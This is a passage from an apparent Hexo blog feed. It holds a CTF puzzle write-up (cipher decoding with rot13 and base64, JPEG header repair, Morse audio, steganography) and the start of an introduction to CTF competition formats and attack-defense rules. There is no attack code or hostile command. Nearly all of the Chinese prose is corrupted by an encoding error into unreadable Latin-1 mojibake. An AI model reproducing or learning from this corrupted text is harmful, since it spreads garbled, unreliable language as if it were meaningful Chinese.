href="https://adworld.xctf.org.cn/media/task/attachments/26b2be68dfb841b9914e97315505effb.docx">é™„ä»¶ä¸‹è½½é“¾æ¥</a></li></ul></blockquote><p>ä¸‹è½½é™„ä»¶å‘ç°æ˜¯ä¸€ä¸ªdocxæ–‡æ¡£ï¼Œå…¶ä¸­æœ‰ä¸€æ®µä½›è¯­â€¦</p><p><img src="https://raw.githubusercontent.com/QGrain/picBed/master/img/20191015225149.png" alt=""></p><ol><li>å¯¹äº<strong>ä¸ä½›è®ºç¦…ç³»åˆ—</strong>çš„åŠ è§£å¯†ï¼Œæˆ‘æš‚æ—¶æ²¡æœ‰æ·±å…¥äº†è§£ï¼Œä¸”å…ˆä½¿ç”¨<a href="http://weibo.com/selphy/">è“è‰²çš„é£ä¹‹ç²¾çµ</a>åˆ¶ä½œçš„<a href="http://www.keyfc.net/bbs/tools/tudoucode.aspx">ä¸ä½›è®ºç¦…åŠ è§£å¯†åœ¨çº¿å·¥å…·</a>å°†è¯¥å¯†æ–‡è§£å¯†</li></ol><p><img src="https://raw.githubusercontent.com/QGrain/picBed/master/img/20191015225556.png" alt=""></p><p>å¾—åˆ°ä¾æ—§æ˜¯åŠ è¿‡å¯†çš„å­—ç¬¦ä¸²<code>MzkuM3gvMUAwnzuvn3cgozMlMTuvqzAenJchMUAeqzWenzEmLJW9</code></p><ol><li>ç”±äºæ¯ä¸€ä¸ªå­—ç¬¦å‡ä¸ºbase64å­—ç¬¦é›†çš„å¯æ‰“å°å­—ç¬¦ï¼Œæ‰€ä»¥çŒœæµ‹æ˜¯å¦æ˜¯ç»è¿‡Base64åŠ è¿‡å¯†çš„ã€‚ç„¶è€Œä½¿ç”¨Baseå®¶æ—è§£å¯†å·¥å…·æ ¹æœ¬æ— æ³•æˆåŠŸè§£å¯†ã€‚è¯´æ˜åº”è¯¥ç”±å¦ä¸€ç§åŠ å¯†ç®—æ³•åŠ è¿‡å¯†çš„ã€‚<strong>ç”±äºåŠ å¯†ä¸²ä»ç„¶ä¸ºASCIIå¯ç¼–ç æ‰“å°çš„å¸¸è§„å­—ç¬¦ï¼Œé‚å°è¯•rot-13åŠ è§£å¯†ç®—æ³•</strong></li></ol><p><img src="https://raw.githubusercontent.com/QGrain/picBed/master/img/20191015225918.png" alt=""></p><ol><li>ç¼–å†™è„šæœ¬ï¼Œè§£å¯†è¯¥å­—ç¬¦ä¸²ï¼Œæ³¨æ„rot-13åŠ å¯†ç®—æ³•æ— è®ºåŠ è¿˜æ˜¯å‡ç»“æœéƒ½ä¸€æ ·ã€‚</li></ol><p><img src="https://raw.githubusercontent.com/QGrain/picBed/master/img/20191015230007.png" alt=""></p><ol><li>æœ€åé€ç»™Base64è§£ç ï¼Œå¾—åˆ°flag</li></ol><p><img src="https://raw.githubusercontent.com/QGrain/picBed/master/img/20191015230129.png" alt=""></p><h1 id="3-ä¸€é“æœ‰ç‚¹å¤æ‚çš„é¢˜ç›®"><a href="#3-ä¸€é“æœ‰ç‚¹å¤æ‚çš„é¢˜ç›®" class="headerlink" title="3 ä¸€é“æœ‰ç‚¹å¤æ‚çš„é¢˜ç›®"></a>3 ä¸€é“æœ‰ç‚¹å¤æ‚çš„é¢˜ç›®<img src = "https://raw.githubusercontent.com/QGrain/picBed/master/img/star_icon.png" width = 30><img src = "https://raw.githubusercontent.com/QGrain/picBed/master/img/star_icon.png" width = 30><img src = "https://raw.githubusercontent.com/QGrain/picBed/master/img/star_icon.png" width = 30></h1><p>é¢˜ç›®é™„ä»¶: <a href="http://ctf5.shiyanbar.com/stega/hell/æ¬¢è¿æ¥åˆ°åœ°ç‹±.zip">é“¾æ¥</a></p><blockquote><p>è¿™æ˜¯ä¸€é“ç‰¹åˆ«ç»•çš„é¢˜ç›®</p></blockquote><ol><li>è§£å‹é™„ä»¶ï¼Œå¾—åˆ° <strong>æ¬¢è¿æ¥åˆ°åœ°ç‹±</strong> çš„æ–‡ä»¶å¤¹</li></ol><p><img src="https://raw.githubusercontent.com/QGrain/picBed/master/img/20191015191108.png" alt=""></p><ol><li>é¦–å…ˆæ‰“å¼€<strong>åœ°ç‹±ä¼Šå§‹.jpg</strong>ï¼Œå‘ç°å›¾ç‰‡æ ¼å¼ä¸æ­£ç¡®</li></ol><p><img src="https://raw.githubusercontent.com/QGrain/picBed/master/img/20191015191232.png" alt=""></p><ol><li>ç”¨winhexæ‰“å¼€è¯¥å›¾ç‰‡çš„å­—èŠ‚ç ï¼Œå‘ç°æ–‡ä»¶å¤´éƒ¨æœ‰ç¼ºå¤±ï¼Œç¼ºå°‘æ–‡ä»¶çš„å‰4ä¸ªå­—èŠ‚ä¿¡æ¯</li></ol><p><img src="https://raw.githubusercontent.com/QGrain/picBed/master/img/20191015192538.png" alt=""></p><p><img src="https://raw.githubusercontent.com/QGrain/picBed/master/img/20191015192222.png" alt=""></p><p>åœ¨æ–‡ä»¶å¤´éƒ¨æ·»åŠ 4ä¸ªå­—èŠ‚çš„å†…å®¹ <code>FFD8 FFE0</code>, å›¾ç‰‡ä¿®å¤æˆåŠŸï¼Œå¾—åˆ°ä»¥ä¸‹å†…å®¹ï¼š</p><p><img src="https://raw.githubusercontent.com/QGrain/picBed/master/img/20191015192044.png" alt=""></p><ol><li>ä¸‹è½½ç½‘ç›˜èµ„æºæ–‡ä»¶ï¼š<code>åœ°ç‹±ä¹‹å£°.wav</code></li></ol><p><img src="https://raw.githubusercontent.com/QGrain/picBed/master/img/20191015192859.png" alt=""></p><p><img src="https://raw.githubusercontent.com/QGrain/picBed/master/img/20191015194913.png" alt=""></p><ol><li>æ ¹æ®æ³¢å½¢å›¾çš„å˜åŒ–ï¼ŒçŒœæµ‹æ˜¯æ‘©å°”æ–¯ç”µç <code>-.- . -.-- .-.. . - ..- ... --. ---</code></li></ol><p>è¯‘ç å¾—åˆ°<code>keyletusgo</code></p><ol><li>æ‰“å¼€<strong>ç¬¬äºŒå±‚åœ°ç‹±.docx</strong>ï¼Œæœ‰ä¸€å¼ å›¾ç‰‡å’Œä¸€äº›æ–‡å­—ï¼Œä½†æ˜¯çœ‹ä¸å‡ºæ¥æœ‰ä»€ä¹ˆæœ‰ä»·å€¼çš„ä¿¡æ¯ã€‚äºæ˜¯æ‰“å¼€wordè®¾ç½®ä¸­çš„æ˜¾ç¤ºéšè—æ–‡å­—ï¼Œå¾—åˆ°æç¤º<strong>â€œå›¾ç‰‡é‡‡ç”¨äº†éšå†™æŠ€æœ¯â€</strong></li></ol><p><img src="https://raw.githubusercontent.com/QGrain/picBed/master/img/20191015210549.png" alt=""></p><p><img src="C:\Users\zhiyu\AppData\Roaming\Typora\typora-user-images\1571144719692.png" alt="1571144719692"></p><ol><li>ä½¿ç”¨éšå†™æœ¯åŠ è§£å¯†åœ¨çº¿å·¥å…·aToolï¼Œå¾—åˆ°å‹ç¼©æ–‡ä»¶çš„è§£å‹å¯†ç </li></ol><p><img src="https://raw.githubusercontent.com/QGrain/picBed/master/img/20191015212504.png" alt=""></p><ol><li>å‹ç¼©æ–‡ä»¶å¤¹æ‰“å¼€åå¾—åˆ°ä¸€å¼ å›¾ç‰‡å’Œä¸€ä¸ªæ–‡æœ¬æ–‡æ¡£ï¼Œæ–‡æœ¬æ–‡æ¡£ä¸­çš„bitåºåˆ—ç›´æ¥ASCIIç¼–ç å¾—åˆ°å­—ç¬¦ä¸²<strong>â€œruokoulingâ€</strong></li></ol><p><img src="https://raw.githubusercontent.com/QGrain/picBed/master/img/20191015213006.png" alt=""><img src="https://raw.githubusercontent.com/QGrain/picBed/master/img/20191015212829.png" alt=""></p><p><strong>è¿·æƒ‘ï¼æ­¤é¢˜çš„åç»­æ–‡ä»¶ä¼¼ä¹ä¸¢å¤±äº†ï¼Œæ‰€ä»¥è¿™ä¸€é¢˜çš„åˆ†æå°±åˆ°è¿™é‡Œã€‚</strong></p><p><strong>è¿™ä¸€é“é¢˜å¹¶ä¸æ˜¯å¾ˆå®˜æ–¹ï¼Œä½†ä¹Ÿèƒ½ä»¥æ­¤çœ‹å‡ºCTFçš„é¢˜ç›®æœ‰æ—¶éœ€è¦å¾ˆå¤§çš„è„‘å›è·¯ã€‚</strong></p><p><strong><em>æœ›è¯¸å›å…±å‹‰</em></strong></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CTFå…¥é—¨</title>
    <link href="/2019/10/14/CTF%E5%85%A5%E9%97%A8/"/>
    <url>/2019/10/14/CTF%E5%85%A5%E9%97%A8/</url>
    
    <content type="html"><![CDATA[<h2 id="1-CTFç®€ä»‹"><a href="#1-CTFç®€ä»‹" class="headerlink" title="1 CTFç®€ä»‹"></a>1 CTFç®€ä»‹</h2><p>CTFï¼ˆCapture The Flagï¼‰ä¸­æ–‡ä¸€èˆ¬è¯‘ä½œå¤ºæ——èµ›ï¼Œåœ¨ç½‘ç»œå®‰å…¨é¢†åŸŸä¸­æŒ‡çš„æ˜¯ç½‘ç»œå®‰å…¨æŠ€æœ¯äººå‘˜ä¹‹é—´è¿›è¡ŒæŠ€æœ¯ç«æŠ€çš„ä¸€ç§æ¯”èµ›å½¢å¼ã€‚CTFèµ·æºäº1996å¹´DEFCONå…¨çƒé»‘å®¢å¤§ä¼šï¼Œä»¥ä»£æ›¿ä¹‹å‰é»‘å®¢ä»¬é€šè¿‡äº’ç›¸å‘èµ·çœŸå®æ”»å‡»è¿›è¡ŒæŠ€æœ¯æ¯”æ‹¼çš„æ–¹å¼ã€‚å‘å±•è‡³ä»Šï¼Œå·²ç»æˆä¸ºå…¨çƒèŒƒå›´ç½‘ç»œå®‰å…¨åœˆæµè¡Œçš„ç«èµ›å½¢å¼ï¼Œè€ŒDEFCONä½œä¸ºCTFèµ›åˆ¶çš„å‘æºåœ°ï¼ŒDEFCON CTFä¹Ÿæˆä¸ºäº†ç›®å‰å…¨çƒæœ€é«˜æŠ€æœ¯æ°´å¹³å’Œå½±å“åŠ›çš„CTFç«èµ›ï¼Œç±»ä¼¼äºCTFèµ›åœºä¸­çš„â€œä¸–ç•Œæ¯â€ ã€‚</p><span id="more"></span><h2 id="2-CTFæ¯”èµ›æ¨¡å¼"><a href="#2-CTFæ¯”èµ›æ¨¡å¼" class="headerlink" title="2 CTFæ¯”èµ›æ¨¡å¼"></a>2 CTFæ¯”èµ›æ¨¡å¼</h2><h3 id="2-1-è§£é¢˜æ¨¡å¼-Jeopardy"><a href="#2-1-è§£é¢˜æ¨¡å¼-Jeopardy" class="headerlink" title="2.1 è§£é¢˜æ¨¡å¼(Jeopardy)"></a>2.1 è§£é¢˜æ¨¡å¼(Jeopardy)</h3><p>åœ¨è§£é¢˜æ¨¡å¼CTFèµ›åˆ¶ä¸­ï¼Œå‚èµ›é˜Ÿä¼å¯ä»¥é€šè¿‡äº’è”ç½‘æˆ–è€…ç°åœºç½‘ç»œå‚ä¸ï¼Œè¿™ç§æ¨¡å¼çš„CTFç«èµ›ä¸ACMç¼–ç¨‹ç«èµ›ã€ä¿¡æ¯å­¦å¥¥èµ›æ¯”è¾ƒç±»ä¼¼ï¼Œä»¥è§£å†³ç½‘ç»œå®‰å…¨æŠ€æœ¯æŒ‘æˆ˜é¢˜ç›®çš„åˆ†å€¼å’Œæ—¶é—´æ¥æ’åï¼Œé€šå¸¸ç”¨äºåœ¨çº¿é€‰æ‹”èµ›ã€‚</p><p>ä¸åŒçš„æ˜¯è¿™ä¸ªè§£é¢˜æ¨¡å¼ä¸€èˆ¬ä¼šè®¾ç½® <strong>ä¸€è¡€</strong> ã€ <strong>äºŒè¡€</strong> ã€ <strong>ä¸‰è¡€</strong> ï¼Œä¹Ÿå³æœ€å…ˆå®Œæˆçš„å‰ä¸‰æ”¯é˜Ÿä¼ä¼šè·å¾—é¢å¤–åˆ†å€¼ï¼Œæ‰€ä»¥è¿™ä¸ä»…æ˜¯å¯¹é¦–å…ˆè§£å‡ºé¢˜ç›®çš„é˜Ÿä¼çš„åˆ†å€¼é¼“åŠ±ï¼Œä¹Ÿæ˜¯ä¸€ç§å›¢é˜Ÿèƒ½åŠ›çš„é—´æ¥ä½“ç°ã€‚</p><p>å½“ç„¶è¿˜æœ‰ä¸€ç§æµè¡Œçš„è®¡åˆ†è§„åˆ™æ˜¯è®¾ç½®æ¯é“é¢˜ç›®çš„åˆå§‹åˆ†æ•°åï¼Œæ ¹æ®è¯¥é¢˜çš„æˆåŠŸè§£ç­”é˜Ÿä¼æ•°ï¼Œæ¥é€æ¸é™ä½è¯¥é¢˜çš„åˆ†å€¼ï¼Œä¹Ÿå°±æ˜¯è¯´å¦‚æœè§£ç­”è¿™é“é¢˜çš„äººæ•°è¶Šå¤šï¼Œé‚£ä¹ˆè¿™é“é¢˜çš„åˆ†å€¼å°±è¶Šä½ã€‚æœ€åä¼šä¸‹é™åˆ°ä¸€ä¸ªä¿åº•åˆ†å€¼åä¾¿ä¸å†ä¸‹é™ã€‚</p><p>é¢˜ç›®ç±»å‹ä¸»è¦åŒ…å« <strong>Web ç½‘ç»œæ”»é˜²</strong> ã€ <strong>RE é€†å‘å·¥ç¨‹</strong> ã€ <strong>Pwn äºŒè¿›åˆ¶æ¼æ´åˆ©ç”¨</strong> ã€ <strong>Crypto å¯†ç æ”»å‡»</strong> ã€ <strong>Mobile ç§»åŠ¨å®‰å…¨</strong> ä»¥åŠ <strong>Misc å®‰å…¨æ‚é¡¹</strong> è¿™å…­ä¸ªç±»åˆ«ã€‚</p><p>ä¸¾ä¾‹ï¼Œæ¯”å¦‚ </p><h3 id="2-2-æ”»é˜²æ¨¡å¼-Attack-and-Defense"><a href="#2-2-æ”»é˜²æ¨¡å¼-Attack-and-Defense" class="headerlink" title="2.2 æ”»é˜²æ¨¡å¼(Attack and Defense)"></a>2.2 æ”»é˜²æ¨¡å¼(Attack and Defense)</h3><h4 id="2-2-1-æ¦‚è¿°"><a href="#2-2-1-æ¦‚è¿°" class="headerlink" title="2.2.1 æ¦‚è¿°"></a>2.2.1 æ¦‚è¿°</h4><p>æ”»é˜²æ¨¡å¼å¸¸è§äºçº¿ä¸‹å†³èµ›ã€‚åœ¨æ”»é˜²æ¨¡å¼ä¸­ï¼Œåˆå§‹æ—¶åˆ»ï¼Œæ‰€æœ‰å‚èµ›é˜Ÿä¼æ‹¥æœ‰ç›¸åŒçš„ç³»ç»Ÿç¯å¢ƒï¼ˆåŒ…å«è‹¥å¹²æœåŠ¡ï¼Œå¯èƒ½ä½äºä¸åŒçš„æœºå™¨ä¸Šï¼‰ï¼Œå¸¸ç§°gameboxï¼Œå‚èµ›é˜Ÿä¼æŒ–æ˜ç½‘ç»œæœåŠ¡æ¼æ´å¹¶æ”»å‡»å¯¹æ‰‹æœåŠ¡è·å– flag æ¥å¾—åˆ†ï¼Œä¿®è¡¥è‡ªèº«æœåŠ¡æ¼æ´è¿›è¡Œé˜²å¾¡ä»è€Œé˜²æ­¢æ‰£åˆ†ï¼ˆä¸€èˆ¬æ¥è¯´é˜²å¾¡åªèƒ½é¿å…ä¸¢åˆ†ï¼Œå½“ç„¶æœ‰çš„æ¯”èµ›åœ¨é˜²å¾¡ä¸Šå¯ä»¥å¾—åˆ†ï¼‰</p><p>æ”»é˜²æ¨¡å¼CTFèµ›åˆ¶å¯ä»¥å®æ—¶é€šè¿‡å¾—åˆ†åæ˜ å‡ºæ¯”èµ›æƒ…å†µï¼Œæœ€ç»ˆä¹Ÿä»¥å¾—åˆ†ç›´æ¥åˆ†å‡ºèƒœè´Ÿï¼Œæ˜¯ä¸€ç§ç«äº‰æ¿€çƒˆï¼Œå…·æœ‰<strong>å¾ˆå¼ºè§‚èµæ€§</strong>å’Œ<strong>é«˜åº¦é€æ˜æ€§</strong>çš„ç½‘ç»œå®‰å…¨èµ›åˆ¶ã€‚åœ¨è¿™ç§èµ›åˆ¶ä¸­ï¼Œä¸ä»…ä»…æ˜¯æ¯”å‚èµ›é˜Ÿå‘˜çš„æ™ºåŠ›å’ŒæŠ€æœ¯ï¼Œä¹Ÿæ¯”ä½“åŠ›ï¼ˆå› ä¸ºæ¯”èµ›ä¸€èˆ¬éƒ½ä¼šæŒç»­48å°æ—¶åŠä»¥ä¸Šï¼‰ï¼ŒåŒæ—¶ä¹Ÿæ¯”å›¢é˜Ÿä¹‹é—´çš„åˆ†å·¥é…åˆä¸åˆä½œã€‚</p><p>ä¸€èˆ¬æ¯”èµ›çš„å…·ä½“ç¯å¢ƒä¼šåœ¨<strong>å¼€èµ›å‰ä¸€å¤©æˆ–è€…å½“å¤©å¼€èµ›å‰åŠå°æ—¶</strong>ç”±æ¯”èµ›ä¸»åŠæ–¹ç»™å‡ºï¼ˆæ˜¯ä¸€ä»½å‡ é¡µçš„å°æ–‡æ¡£ï¼‰ã€‚åœ¨è¿™ä¸€æ®µæ—¶é—´å†…ï¼Œä½ éœ€è¦æ ¹æ®ä¸»åŠæ–¹æä¾›çš„æ–‡æ¡£<strong>ç†Ÿæ‚‰ç¯å¢ƒå¹¶åšå¥½é˜²å¾¡</strong>ã€‚</p><p>åœ¨æ¯”èµ›å¼€å§‹å‰åŠå°æ—¶ï¼Œè¿™åŠå°æ—¶å†…æ˜¯æ— æ³•è¿›è¡Œæ”»å‡»çš„ï¼Œå„æ”¯é˜Ÿä¼éƒ½ä¼šåŠ ç´§ç†Ÿæ‚‰æ¯”èµ›ç½‘ç»œç¯å¢ƒï¼Œå¹¶åšå¥½é˜²å¾¡å‡†å¤‡ã€‚è‡³äºæ•Œæ–¹ Gamebox çš„ IP åœ°å€ï¼Œåˆ™éœ€è¦é ä½ è‡ªå·±åœ¨ç»™å‡ºç½‘æ®µä¸­å‘ç°ã€‚</p><p>å¦‚æœæ˜¯åˆ†ä¸ºä¸Šåˆä¸‹åˆä¸¤åœºæ”»é˜²èµ›çš„è¯ï¼Œé‚£ä¹ˆä¸Šåˆå’Œä¸‹åˆçš„ Gamebox æ¼æ´æœåŠ¡ä¼šæ›´æ¢ï¼ˆé¿å…æ¯”èµ›ä¸­é€”ä¼‘æ¯æ—¶é€‰æ‰‹äº¤æµï¼‰ï¼Œä½†ç®¡ç†æ—¶è¦ç”¨çš„ IP åœ°å€ç­‰ä¿¡æ¯ä¸ä¼šæ”¹å˜ã€‚ä¹Ÿå°±æ˜¯ <strong>ä¸‹åˆä¼šæ¢æ–°é¢˜</strong> ã€‚</p><p>ä¸€èˆ¬æƒ…å†µä¸‹ï¼Œä¸»åŠæ–¹ä¼šæä¾›ç½‘çº¿ï¼Œ<strong>ä½†å¹¶ä¸ä¼šæä¾›ç½‘çº¿è½¬æ¥å£ï¼Œæ‰€ä»¥éœ€è¦è‡ªå¤‡ã€‚</strong></p><h4 id="2-2-2-åŸºæœ¬è§„åˆ™"><a href="#2-2-2-åŸºæœ¬è§„åˆ™" class="headerlink" title="2.2.2 åŸºæœ¬è§„åˆ™"></a>2.2.2 åŸºæœ¬è§„åˆ™</h4><p>æ”»é˜²æ¨¡å¼ä¸€èˆ¬çš„è§„åˆ™å¦‚ä¸‹</p><ul><li>æˆ˜é˜Ÿåˆå§‹åˆ†æ•°å‡ä¸º x åˆ†</li><li>æ¯”èµ›ä»¥ 5/10 åˆ†é’Ÿä¸ºä¸€ä¸ªå›åˆï¼Œæ¯å›åˆä¸»åŠæ–¹ä¼šæ›´æ–°å·²æ”¾å‡ºæœåŠ¡çš„ Flag</li><li>æ¯å›åˆå†…ï¼Œä¸€ä¸ªæˆ˜é˜Ÿçš„ä¸€ä¸ªæœåŠ¡è¢«æ¸—é€æ”»å‡»æˆåŠŸï¼ˆè¢«æ‹¿ Flag å¹¶æäº¤ï¼‰ï¼Œåˆ™æ‰£é™¤ä¸€å®šåˆ†æ•°ï¼Œæ”»å‡»æˆåŠŸçš„æˆ˜é˜Ÿå¹³åˆ†è¿™äº›åˆ†æ•°ã€‚</li><li>æ¯å›åˆå†…ï¼Œå¦‚æœæˆ˜é˜Ÿèƒ½å¤Ÿç»´æŠ¤è‡ªå·±çš„æœåŠ¡æ­£å¸¸è¿è¡Œï¼Œåˆ™åˆ†æ•°ä¸ä¼šå‡å°‘ï¼ˆå¦‚æœé˜²å¾¡æˆåŠŸåŠ åˆ†åˆ™ä¼šåŠ åˆ†ï¼‰ï¼›</li><li>å¦‚æœä¸€ä¸ªæœåŠ¡å®•æœºæˆ–å¼‚å¸¸æ— æ³•é€šè¿‡æµ‹è¯•ï¼Œåˆ™å¯èƒ½ä¼šæ‰£åˆ†ï¼ŒæœåŠ¡æ­£å¸¸çš„æˆ˜é˜Ÿå¹³åˆ†è¿™äº›åˆ†ã€‚å¾€å¾€æœåŠ¡å¼‚å¸¸ä¼šæ‰£é™¤è¾ƒå¤šçš„åˆ†æ•°ã€‚</li><li>å¦‚æœè¯¥å›åˆå†…æ‰€æœ‰æˆ˜é˜Ÿçš„æœåŠ¡éƒ½å¼‚å¸¸ï¼Œåˆ™è®¤ä¸ºæ˜¯ä¸å¯æŠ—æ‹’å› ç´ é€ æˆï¼Œåˆ†æ•°éƒ½ä¸å‡å°‘ã€‚</li><li>æ¯å›åˆå†…ï¼ŒæœåŠ¡å¼‚å¸¸å’Œè¢«æ‹¿ Flag å¯ä»¥åŒæ—¶å‘ç”Ÿï¼Œå³æˆ˜é˜Ÿåœ¨ä¸€ä¸ªå›åˆå†…å•ä¸ªæœåŠ¡å¯èƒ½ä¼šæ‰£é™¤ä¸¤è€…å åŠ çš„åˆ†æ•°ã€‚</li><li>ç¦æ­¢é˜Ÿä¼ä½¿ç”¨é€šç”¨é˜²å¾¡æ–¹æ³•</li><li>è¯·å‚èµ›é˜Ÿä¼åœ¨æ¯”èµ›å¼€å§‹æ—¶å¯¹æ‰€æœ‰æœåŠ¡è¿›è¡Œå¤‡ä»½ï¼Œè‹¥å› è‡ªèº«åŸå› å¯¼è‡´æœåŠ¡æ°¸ä¹…æŸåæˆ–ä¸¢å¤±ï¼Œæ— æ³•æ¢å¤ï¼Œä¸»åŠæ–¹ä¸æä¾›é‡ç½®æœåŠ¡</li><li>ç¦æ­¢å¯¹èµ›é¢˜ä»¥å¤–çš„æ¯”èµ›å¹³å°å‘èµ·æ”»å‡»ï¼ŒåŒ…æ‹¬ä½†ä¸é™äºåœ¨ gamebox ææƒ rootã€åˆ©ç”¨ä¸»åŠæ–¹å¹³å°æ¼æ´ç­‰ï¼Œè¿è§„è€…ç«‹åˆ»è¢«å–æ¶ˆå‚èµ›èµ„æ ¼</li><li>å‚èµ›é˜Ÿä¼å¦‚æœå‘ç°å…¶ä»–é˜Ÿä¼å­˜åœ¨è¿è§„è¡Œä¸ºï¼Œè¯·ç«‹åˆ»ä¸¾æŠ¥ï¼Œä¸»åŠæ–¹ä¼šä¸¥æ ¼å®¡æ ¸å¹¶ä½œå‡ºç›¸åº”åˆ¤ç½šã€‚</li></ul><h4 id="2-2-3-ç½‘ç»œç¯å¢ƒ"><a href="#2-2-3-ç½‘ç»œç¯å¢ƒ" class="headerlink" title="2.2.3 ç½‘ç»œç¯å¢ƒ"></a>2.2.3 ç½‘ç»œç¯å¢ƒ</h4><p>æ–‡æ¡£ä¸Šä¸€èˆ¬éƒ½ä¼šæœ‰æ¯”èµ›ç¯å¢ƒçš„ <strong>ç½‘ç»œæ‹“æ‰‘å›¾</strong> ï¼ˆå¦‚ä¸‹å›¾ï¼‰ï¼Œæ¯æ”¯é˜Ÿä¼ä¼šç»´æŠ¤è‹¥å¹²çš„ <strong>Gameboxï¼ˆå·±æ–¹æœåŠ¡å™¨ï¼‰</strong> ï¼ŒGamebox ä¸Šéƒ¨ç½²æœ‰å­˜åœ¨æ¼æ´çš„æœåŠ¡ã€‚</p><p><img src="https://raw.githubusercontent.com/QGrain/picBed/master/img/20191014164950.png" alt=""></p><p>æ–‡æ¡£ä¸Šä¼šåŒ…æ‹¬é€‰æ‰‹ï¼Œæ”»é˜²ç¯å¢ƒï¼Œä¸»åŠæ–¹ä¸‰è€…çš„ç¯å¢ƒã€‚</p><p>é€‰æ‰‹éœ€è¦åœ¨ä¸ªäººç”µè„‘ä¸Šé…ç½®æˆ–è€… DHCP è‡ªåŠ¨è·å–</p><ul><li>IP åœ°å€</li><li>ç½‘å…³</li><li>æ©ç  DNS æœåŠ¡å™¨åœ°å€</li></ul><p>æ”»é˜²ç¯å¢ƒ</p><ul><li>Gamebox æ‰€å¤„åœ°å€ï¼ŒåŒ…æ‹¬å·±æ–¹å’Œå…¶ä»–é˜Ÿä¼çš„åœ°å€ã€‚</li><li>æ¯”èµ›ä¸€èˆ¬ä¼šæä¾›é˜Ÿä¼çš„ id ä¸å¯¹åº” ip çš„æ˜ å°„è¡¨ï¼Œä»¥ä¾¿äºè®©é€‰æ‰‹æŒ‡å®šæ°å½“çš„æ”»é˜²ç­–ç•¥ã€‚</li></ul><p>ä¸»åŠæ–¹ç¯å¢ƒ</p><ul><li>æ¯”èµ›ç­”é¢˜å¹³å°</li><li>æäº¤ flag æ¥å£</li><li>æµé‡è®¿é—®æ¥å£</li></ul><h4 id="2-2-4-è®¿é—®-Gamebox"><a href="#2-2-4-è®¿é—®-Gamebox" class="headerlink" title="2.2.4 è®¿é—® Gamebox"></a>2.2.4 è®¿é—® Gamebox</h4><p>å‚èµ›æ–‡æ¡£ä¸­ä¼šç»™å‡ºé˜Ÿä¼ç™»å½• gamebox çš„æ–¹å¼ï¼Œä¸€èˆ¬æ¥è¯´å¦‚ä¸‹</p><ul><li>ç”¨æˆ·åä¸º ctf</li><li>ä¸€èˆ¬ä¼šé€šè¿‡ ssh ç™»å½•ï¼Œç™»å½•æ–¹å¼ä¸ºå¯†ç æˆ–è€…ç§é’¥ã€‚</li></ul><p>è‡ªç„¶ï¼Œåœ¨ç™»å½•ä¸Šæˆ˜é˜Ÿæœºå™¨å<strong>åº”è¯¥ä¿®æ”¹æ‰€æœ‰çš„é»˜è®¤å¯†ç </strong>ï¼ŒåŒæ—¶ä¸åº”è¯¥è®¾ç½®å¼±å¯†ç ã€‚</p><h4 id="2-2-5-æ¯”èµ›çš„ä¸€äº›ç­–ç•¥"><a href="#2-2-5-æ¯”èµ›çš„ä¸€äº›ç­–ç•¥" class="headerlink" title="2.2.5 æ¯”èµ›çš„ä¸€äº›ç­–ç•¥"></a>2.2.5 æ¯”èµ›çš„ä¸€äº›ç­–ç•¥</h4><ol><li>åœ¨æ¯”èµ›è¿‡ç¨‹ä¸­ï¼Œä¸å®œæ­»è€—åœ¨ä¸€é“é¢˜ä¸Šï¼Œç”±äºä¸€è¡€çš„ä¼˜åŠ¿æ€§ï¼Œåœ¨æ¯”èµ›è¿‡ç¨‹ä¸­æ›´åº”è¯¥å…¨é¢äº†è§£èµ›é¢˜éš¾åº¦ï¼Œå…ˆä» <strong>ç®€å•é¢˜</strong> å¼€å§‹è¿›è¡Œåˆ†æï¼Œæ­¥æ­¥ä¸ºè¥ã€‚</li><li>æ¯”èµ›è¿‡ç¨‹ä¸­ï¼Œä¸¤æä¼šä¸¥é‡åˆ†åŒ–ã€‚åº”è¯¥ç€åŠ›æ‰“å‡»å’Œè‡ªå·±å®åŠ›ç›¸å½“å’Œæ¯”è‡ªå·±é˜Ÿä¼æ›´å¼ºçš„é˜Ÿä¼ï¼Œå°¤å…¶æ˜¯åˆ†æ•°ç›¸å·®æ— å‡ çš„æƒ…å†µä¸‹ï¼Œæ›´è¦ä¸¥é˜²ä¸¥å®ˆã€‚</li><li>æ¯”èµ›ä¸­ NPC ä¼šä¸å®šæ—¶å‘å‡ºæ”»å‡»æµé‡ã€‚ä»æ”»å‡»æµé‡ä¸­å¯ä»¥å¾—åˆ° payloadã€‚</li><li>ä¸€å®šè¦æŠŠ NPC å¾€æ­»é‡Œæ‰“ã€‚</li><li>åœ¨å¼€èµ›åˆå¯ä»¥å°†æ‰€æœ‰çš„ç®¡ç†å¯†ç éƒ½è®¾ç½®ä¸ºåŒä¸€ä¸ªå¯†ç ï¼Œè¿™æ ·æ–¹ä¾¿é˜Ÿå‘˜ç™»å½•ç®¡ç†ã€‚åœ¨åˆæœŸå°†æ‰€æœ‰æ–‡ä»¶å¤‡ä»½ä¸‹æ¥ä¾›é˜Ÿå†…åˆ†äº«ã€‚</li></ol><h3 id="2-3-æ··åˆæ¨¡å¼-Mix"><a href="#2-3-æ··åˆæ¨¡å¼-Mix" class="headerlink" title="2.3 æ··åˆæ¨¡å¼(Mix)"></a>2.3 æ··åˆæ¨¡å¼(Mix)</h3><p>ç»“åˆäº†è§£é¢˜æ¨¡å¼ä¸æ”»é˜²æ¨¡å¼çš„CTFèµ›åˆ¶ï¼Œæ¯”å¦‚å‚èµ›é˜Ÿä¼é€šè¿‡è§£é¢˜å¯ä»¥è·å–ä¸€äº›åˆå§‹åˆ†æ•°ï¼Œç„¶åé€šè¿‡æ”»é˜²å¯¹æŠ—è¿›è¡Œå¾—åˆ†å¢å‡çš„é›¶å’Œæ¸¸æˆï¼Œæœ€ç»ˆä»¥å¾—åˆ†é«˜ä½åˆ†å‡ºèƒœè´Ÿã€‚é‡‡ç”¨æ··åˆæ¨¡å¼CTFèµ›åˆ¶çš„å…¸å‹ä»£è¡¨å¦‚iCTFå›½é™…CTFç«èµ›ã€‚</p><h3 id="2-4-æˆ˜äº‰åˆ†äº«æ¨¡å¼-Belluminar"><a href="#2-4-æˆ˜äº‰åˆ†äº«æ¨¡å¼-Belluminar" class="headerlink" title="2.4 æˆ˜äº‰åˆ†äº«æ¨¡å¼(Belluminar)"></a>2.4 æˆ˜äº‰åˆ†äº«æ¨¡å¼(Belluminar)</h3><h4 id="2-4-1-èµ›åˆ¶ä»‹ç»"><a href="#2-4-1-èµ›åˆ¶ä»‹ç»" class="headerlink" title="2.4.1 